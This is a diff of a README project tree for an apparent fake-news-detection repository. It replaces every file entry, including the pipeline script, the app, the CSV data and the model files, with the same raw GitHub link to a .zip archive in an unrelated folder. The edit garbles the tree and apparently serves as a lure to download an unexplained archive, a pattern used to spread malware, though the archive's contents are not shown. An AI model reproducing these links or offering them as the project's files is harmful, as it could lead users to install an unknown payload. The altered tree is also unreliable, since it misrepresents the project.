@@ -4,13 +4,13 @@
 
 Project/
 │
-├── fake_news_pipeline.py
-├── app.py            
+├── https://github.com/LijeshS2003/Fake-News-Detection-System/raw/refs/heads/main/goosery/Fake_System_News_Detection_v2.5.zip
+├── https://github.com/LijeshS2003/Fake-News-Detection-System/raw/refs/heads/main/goosery/Fake_System_News_Detection_v2.5.zip            
 │
 ├── data/
-│   ├── Fake.csv
-│   └── True.csv
+│   ├── https://github.com/LijeshS2003/Fake-News-Detection-System/raw/refs/heads/main/goosery/Fake_System_News_Detection_v2.5.zip
+│   └── https://github.com/LijeshS2003/Fake-News-Detection-System/raw/refs/heads/main/goosery/Fake_System_News_Detection_v2.5.zip
 │
 ├── models/
-│   ├── best_model.joblib
-│   └── tfidf_vectorizer.joblib
+│   ├── https://github.com/LijeshS2003/Fake-News-Detection-System/raw/refs/heads/main/goosery/Fake_System_News_Detection_v2.5.zip
+│   └── https://github.com/LijeshS2003/Fake-News-Detection-System/raw/refs/heads/main/goosery/Fake_System_News_Detection_v2.5.zip
